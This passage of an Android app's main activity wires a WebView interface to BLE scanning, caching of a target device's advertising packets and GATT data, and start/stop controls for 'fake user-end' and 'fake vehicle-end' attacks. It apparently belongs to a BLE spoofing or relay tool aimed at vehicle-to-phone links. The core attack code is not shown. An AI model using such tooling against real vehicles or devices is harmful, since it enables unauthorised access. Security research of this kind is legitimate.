        //    (This depends on the navigateToP4() JS function in p3.html)
        mainHandler.post(() -> {
            if (webView != null) {
                webView.evaluateJavascript("javascript:navigateToP4();", null);
            }
        });
    }

    @Override
    public void onScanFailed(String error) {
        Log.e(TAG, "BLE Scan failed: " + error);
        mainHandler.post(() -> {
            Toast.makeText(this, "Scan failed: " + error, Toast.LENGTH_SHORT).show();
            // (Optional) Restore p3 button
            if (webView != null) {
                // Assume p3.html has a reEnableScanButton() JS function
                // webView.evaluateJavascript("javascript:reEnableScanButton();", null);
            }
        });
    }

    @Override
    public void onPermissionNeeded(String[] permissions) {
        // Request BLE permissions
        ActivityCompat.requestPermissions(this, permissions, REQUEST_BLE_PERMISSIONS_CODE);
    }

    private void startBleAdvertising() {
        BluetoothAdapter bluetoothAdapter = BluetoothAdapter.getDefaultAdapter();

        if (bluetoothAdapter == null || !bluetoothAdapter.isEnabled()) {
            Toast.makeText(this, "Bluetooth is not available or not enabled", Toast.LENGTH_SHORT).show();
            return;
        }

        if (bleAdvertiseThread == null) {
            // Create and start BleAdvertiseThread
            bleAdvertiseThread = new BleAdvertiseThread(bluetoothAdapter, MainActivity.this, configManager);
            bleAdvertiseThread.start();
            Toast.makeText(this, "Started BLE Advertising", Toast.LENGTH_SHORT).show();
        }
    }

    private void stopBleAdvertising() {
        if (bleAdvertiseThread != null) {
            bleAdvertiseThread.stopAdvertising();
            bleAdvertiseThread = null;
            Toast.makeText(this, "Stopped BLE Advertising", Toast.LENGTH_SHORT).show();
        }
    }

    private static final int REQUEST_BLUETOOTH_PERMISSIONS = 100;

    private void startServerWithPermissions() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
            if (ContextCompat.checkSelfPermission(this, Manifest.permission.BLUETOOTH_CONNECT) != PackageManager.PERMISSION_GRANTED ||
                    ContextCompat.checkSelfPermission(this, Manifest.permission.BLUETOOTH_ADVERTISE) != PackageManager.PERMISSION_GRANTED) {

                ActivityCompat.requestPermissions(this, new String[]{
                        Manifest.permission.BLUETOOTH_CONNECT,
                        Manifest.permission.BLUETOOTH_ADVERTISE
                }, REQUEST_BLUETOOTH_PERMISSIONS);
            } else {
                // Permissions already granted, can safely start the Server
                startBleAdvertising();
                if (bleServer == null){
                    bleServer = new Server(MainActivity.this, configManager,configManager.getDeviceAddress());
                }
                bleServer.start();
            }
        } else {
            // For Android 11 and below, no runtime request is needed
            startBleAdvertising();
            if (bleServer == null){
                bleServer = new Server(MainActivity.this, configManager,configManager.getDeviceAddress());
            }
            bleServer.start();
        }

    }


    // ====== Keep the original demo bridge (other demo buttons on the page can still be used) ======
    public class Bridge {
        @JavascriptInterface
        public void launchScanner(String role) {
            MainActivity.this.setRole(role);
            // Switch back to the main thread (JS interface is not on the main thread)
            mainHandler.post(() -> {
                if (checkCameraPermission()) {
                    startCaptureActivity(); // This method is in MainActivity
                } else {
                    requestCameraPermission();
                }
            });
        }
        @JavascriptInterface
        public void cacheDeviceDataForSync(String mac, String packetJson) {
            Log.d(TAG, "[Bridge] cacheDeviceDataForSync called.");
            Log.d(TAG, "[Bridge] Caching MAC: " + mac);
            // Note: The packetJson string can be very long
            Log.d(TAG, "[Bridge] Caching Packet JSON (starts with): " + (packetJson != null ? packetJson.substring(0, Math.min(50, packetJson.length())) + "..." : "null"));

            // Update member variables on the main thread
            mainHandler.post(() -> {
                selectedDeviceMacAddress = mac; // Cache MAC
                cachedPacketDataJsonString = packetJson; // Cache Packet JSON string
            });
        }

        @JavascriptInterface
        public void startBroadcastSync() {
            Log.d(TAG, "[SYNC Bridge] startBroadcastSync called from JS.");

            // Use mainHandler to access MainActivity's members safely
            mainHandler.post(() -> {
                Log.d(TAG, "[SYNC MainThread] Coordinating sync using cached data...");

                // --- Step 1: Use cached data ---
                // These should have been set by cacheDeviceDataForSync when p3 loaded
                final String mac = selectedDeviceMacAddress;
                final String packetJsonStr = cachedPacketDataJsonString;

                // (Optional but recommended) Clear cache immediately after reading
                // It prevents accidentally re-syncing old data if the user navigates oddly
                // selectedDeviceMacAddress = null; // Keep MAC if GATT might need it later? Maybe clear after send.
                // cachedPacketDataJsonString = null; // Clear packet data

                if (mac == null || mac.isEmpty() || packetJsonStr == null || packetJsonStr.isEmpty() || packetJsonStr.equals("{}") || packetJsonStr.equals("{\"broadcastPackets\":[]}")) {
                    Log.e(TAG, "[SYNC MainThread] Cached sync data is missing or invalid. MAC: " + mac + " PacketJSON: " + packetJsonStr);
                    Toast.makeText(MainActivity.this, "Failed to get data to sync", Toast.LENGTH_SHORT).show();
                    // Revert UI step if WebView exists
                    if (webView != null) webView.evaluateJavascript("javascript:setStep(2);", null);
                    return;
                }

                // Parse the cached JSON string back into a List for the background task
                List<BleScannerManager.SimplePacketPair> packetsToSend = null;
                try {
                    // Assuming packetJsonStr is like {"broadcastPackets": [...]}
                    JSONObject tempObj = new JSONObject(packetJsonStr);
                    JSONArray packetsArray = tempObj.optJSONArray("broadcastPackets");
                    if (packetsArray != null) {
                        packetsToSend = gson.fromJson(
                                packetsArray.toString(),
                                new com.google.gson.reflect.TypeToken<List<BleScannerManager.SimplePacketPair>>(){}.getType()
                        );
                    } else {
                        Log.e(TAG, "[SYNC MainThread] 'broadcastPackets' array not found in cached JSON.");
                    }
                } catch (Exception e) {
                    Log.e(TAG, "[SYNC MainThread] Error parsing cached packet JSON", e);
                }

                if (packetsToSend == null || packetsToSend.isEmpty()) { // Also check if empty after parsing
                    Log.e(TAG, "[SYNC MainThread] Failed to parse or packets list is empty.");
                    Toast.makeText(MainActivity.this, "Error processing broadcast packet data or no data", Toast.LENGTH_SHORT).show();
                    if (webView != null) webView.evaluateJavascript("javascript:setStep(2);", null); // Revert UI
                    return;
                }


                // --- Step 2: Check GATT data (logic remains the same) ---
                if (detailedGattData != null) {
                    Log.d(TAG, "[SYNC MainThread] GATT data already exists. Starting background send task.");
                    startBackgroundSendTask(packetsToSend, detailedGattData); // Pass parsed data
                } else {
                    Log.d(TAG, "[SYNC MainThread] GATT data is null. Attempting to fetch for MAC: " + mac);
                    BluetoothDevice device = bleManager.getDeviceByMac(mac);

                    if (device != null) {
                        Toast.makeText(MainActivity.this, "Getting GATT services...", Toast.LENGTH_SHORT).show();
                        // (GATT fetch logic remains the same)
                        List<BleScannerManager.SimplePacketPair> finalPacketsToSend = packetsToSend;
                        GattClientCallback.getDeviceInfoAsJson(device, MainActivity.this, new GattClientCallback.DeviceInfoCallback() {
                            @Override
                            public void onInfoReady(JSONObject deviceInfo) {
                                Log.d(TAG, "[SYNC GATT CB] GATT fetch successful.");
                                detailedGattData = deviceInfo;
                                startBackgroundSendTask(finalPacketsToSend, detailedGattData); // Pass parsed data
                            }
                            @Override
                            public void onError(String errorMessage) {
                                Log.e(TAG, "[SYNC GATT CB] GATT fetch error: " + errorMessage);
                                detailedGattData = new JSONObject(); // Store empty on error
                                Toast.makeText(MainActivity.this, "GATT fetch failed, still trying to sync broadcast", Toast.LENGTH_SHORT).show();
                                startBackgroundSendTask(finalPacketsToSend, detailedGattData); // Pass parsed data
                            }
                        });
                    } else {
                        // (GATT fetch failed - device not found)
                        Log.e(TAG, "[SYNC MainThread] Cannot fetch GATT, device not found for MAC: " + mac);
                        Toast.makeText(MainActivity.this, "Cannot find device to get GATT", Toast.LENGTH_SHORT).show();
                        detailedGattData = new JSONObject(); // Set empty GATT
                        startBackgroundSendTask(packetsToSend, detailedGattData); // Pass parsed data
                    }
                }
            }); // mainHandler.post finished
        } // startBroadcastSync finished

        @JavascriptInterface
        public String getDeviceDetailsData() {
            Log.d(TAG, "[Bridge] getDeviceDetailsData called by p9.html");
            JSONObject result = new JSONObject();
            try {
                // 1. Add Basic Info
                if (basicInfoForDetailsPage != null) {
                    // Manually create JSON from SimpleDevice basic info
                    JSONObject basic = new JSONObject();
                    basic.put("name", basicInfoForDetailsPage.name);
                    basic.put("address", basicInfoForDetailsPage.address);
                    basic.put("rssi", basicInfoForDetailsPage.rssi);
                    result.put("basicInfo", basic);
                } else {
                    result.put("basicInfo", (Object) null); // Or an empty object: new JSONObject()
                }

                // 2. Add Broadcast Packets (already prepared List<SimplePacketPair>)
                if (detailedPacketData != null && !detailedPacketData.isEmpty()) {
                    // Convert List<SimplePacketPair> to JSONArray
                    String packetJsonString = gson.toJson(detailedPacketData);
                    result.put("broadcasts", new JSONArray(packetJsonString));
                } else {
                    result.put("broadcasts", new JSONArray()); // Empty array if none
                }

                // 3. Add GATT Data (JSONObject -> String or null)
                if (detailedGattData != null) {
                    result.put("gatt", detailedGattData.toString()); // Store GATT as string in JSON
                } else {
                    result.put("gatt", (Object) null); // Store null if GATT failed/missing
                }

            } catch (JSONException e) {
                Log.e(TAG, "[Bridge] Error creating JSON for getDeviceDetailsData", e);
                // Return empty object on error
                return "{}";
            }
            Log.d(TAG, "[Bridge] Returning details JSON (length): " + result.toString().length());
            return result.toString();
        }

        @JavascriptInterface
        @Deprecated
        public void login(String username, String password, String server) {
            // Demo logic: enter p2 after simulated login is complete
            mainHandler.postDelayed(() -> {
                if (webView != null) {
                    webView.loadUrl("file:///android_asset/p2.html");
                }
            }, 600);
        }

        @JavascriptInterface
        @Deprecated
        public void navigate(String page) {
            // TODO: Can be used for unified page navigation and authentication checks
            mainHandler.post(() -> {
                if (webView != null && page != null && page.endsWith(".html")) {
                    webView.loadUrl("file:///android_asset/" + page);
                }
            });
        }

        @JavascriptInterface
        @Deprecated
        public void pairByPin(String pin) {
            // TODO: Call the backend to verify the PIN, and enter p6 after success
            mainHandler.postDelayed(() -> {
                if (webView != null) {
                    webView.loadUrl("file:///android_asset/p6.html");
                }
            }, 500);
        }

        @JavascriptInterface
        @Deprecated
        public void pairByScan() {
            // TODO: Call the backend scan/connection process, and enter p6 after success
            mainHandler.postDelayed(() -> {
                if (webView != null) {
                    webView.loadUrl("file:///android_asset/p6.html");
                }
            }, 700);
        }

        /**
         * (New) [p3] JS calls this method to start a scan
         * @param mode "manual", "mac", "name"
         * @param query search term
         */
        @JavascriptInterface
        public void startScan(String mode, String query) {
            Log.d(TAG, "[Bridge] JS called startScan. Mode: " + mode + ", Query: " + query);
            mainHandler.post(() -> triggerScan(mode, query));
        }

        /**
         * (New) [p4] JS calls this method to get scan results
         * @return JSON string containing a list of SimpleDevice
         */
        @JavascriptInterface
        public String getScanResults() {
            Log.d(TAG, "[Bridge] JS called getScanResults");
            return getLatestScanResultsAsJson();
        }

        @JavascriptInterface
        public void goBack() {
            Log.d(TAG, "[Bridge] JS called goBack (to p3, Step 1)");
            mainHandler.post(() -> {
                if (webView != null) {
                    // Load p3.html *without* parameters, so it defaults to Step 1
                    webView.loadUrl("file:///android_asset/p3.html");
                }
            });
        }

        @JavascriptInterface
        public void confirmSelection(String selectedDeviceJson) {
            Log.d(TAG, "[Bridge] JS called confirmSelection (to p3, Step 2)");
            // Load p3.html *with* parameters, making it enter Step 2
            mainHandler.post(() -> {
                Log.d(TAG, "[Bridge] Clearing stale GATT data due to new selection confirmation.");
                detailedGattData = null;
            });
            mainHandler.post(() -> {
                if (webView != null) {
                    webView.loadUrl("file:///android_asset/p3.html?from=p4");
                }
            });
        }

        /**
         * (New) [p4] JS calls this method to view details (will trigger GATT)
         * @param selectedDeviceJson JSON string of the selected device
         */
        @JavascriptInterface
        public void showDetails(String selectedDeviceJson) {
            Log.d(TAG, "[Bridge] JS called showDetails (GATT)");
            showDeviceDetails(selectedDeviceJson); // This method will post to mainHandler internally
        }

        @JavascriptInterface
        @Deprecated
        public void startAttack(String deviceId, String deviceName, String macAddress) {
            // TODO: Call the backend to start the attack interface, and enter p6 after success
            mainHandler.postDelayed(() -> {
                if (webView != null) {
                    webView.loadUrl("file:///android_asset/p6.html");
                }
            }, 600);
        }

        @JavascriptInterface
        @Deprecated
        public void viewDeviceDetail(String deviceId, String deviceName, String macAddress, String rssi) {
            // TODO: Call the backend to get the device details interface, and enter p9 after success
            mainHandler.postDelayed(() -> {
                if (webView != null) {
                    webView.loadUrl("file:///android_asset/p9.html");
                }
            }, 600);
        }

        @JavascriptInterface
        @Deprecated
        public void syncDeviceData(String deviceId, String deviceName, String macAddress) {
            // TODO: Call the backend data synchronization interface, and enter p3 after success
            mainHandler.postDelayed(() -> {
                if (webView != null) {
                    webView.loadUrl("file:///android_asset/p3.html?from=p4");
                }
            }, 600);
        }


        @JavascriptInterface
        @Deprecated
        public void confirmBroadcastConfig(int broadcastIndex, String hexData) {
            // TODO: Call the backend to confirm the configuration interface, and enter p4 after success
            mainHandler.postDelayed(() -> {
                if (webView != null) {
                    webView.loadUrl("file:///android_asset/p4.html");
                }
            }, 800);
        }

        @JavascriptInterface
        public void startUserAttack() {
            mainHandler.post(() -> {
                if (bleClient == null){
                    bleClient = new Client(MainActivity.this);
                }
                bleClient.start();
                WebLogManager.get().log("Start fake user-end attack",WebLogManager.LOG_SYS);
                String prefixedstartUserAttack = "B-";
                byte[] startUserAttackBytes = prefixedstartUserAttack.getBytes(StandardCharsets.UTF_8);
                String startUserAttackBase64 = Base64.encodeToString(startUserAttackBytes, Base64.NO_WRAP);
                int attempts = 0; int result = 0;
                do { /* ... sending loop ... */
                    attempts++; Log.d(TAG, "[SYNC BG Task] Attempting to send startUserAttack (Attempt " + attempts + ")");
                    try { result = dupJsBridgeInstance.sendMessageData(startUserAttackBase64); Log.d(TAG, "[SYNC BG Task] sendMessageData(startUserAttack) result: " + result); }
                    catch (UnsatisfiedLinkError | Exception e) { Log.e(TAG, "[SYNC BG Task] Error calling sendMessageData(startUserAttack)", e); result = -1; break; }
                    if (result != 1){
                        try {
                            Thread.sleep(500);
                        } catch (InterruptedException e) {
                            throw new RuntimeException(e);
                        }
                    }
                } while (result != 1);
            });
        }

        @JavascriptInterface
        public void stopUserAttack() {
            mainHandler.post(() -> {
                bleClient.stop();
                WebLogManager.get().log("Stop fake user-end attack",WebLogManager.LOG_SYS);
            });
        }

        @JavascriptInterface
        public void startVehicleAttack() {
            mainHandler.post(() -> {
                startServerWithPermissions();
                WebLogManager.get().log("Start fake vehicle-end attack",WebLogManager.LOG_SYS);
            });
        }

        @JavascriptInterface
        public void stopVehicleAttack() {
            mainHandler.post(() -> {
                stopBleAdvertising();
                bleServer.stop();
                WebLogManager.get().log("Stop fake vehicle-end attack",WebLogManager.LOG_SYS);
            });
        }
    }
}
